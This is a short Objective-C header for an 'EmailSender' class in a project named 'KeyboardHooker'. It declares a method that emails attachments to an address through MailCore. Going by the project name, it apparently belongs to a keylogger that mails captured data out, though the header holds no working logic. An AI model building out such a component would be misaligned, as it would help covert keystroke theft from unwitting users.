//
//  EmailSender.h
//  KeyboardHooker
//
//  Created by Иван on 01.12.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <MailCore/mailcore.h>

#import "Time.h"
#import "FileManager.h"

@interface EmailSender : NSObject

+ (void)sendEmailWithMail:(NSString *) toAddress Attachments:(NSArray *) attachments;

@end
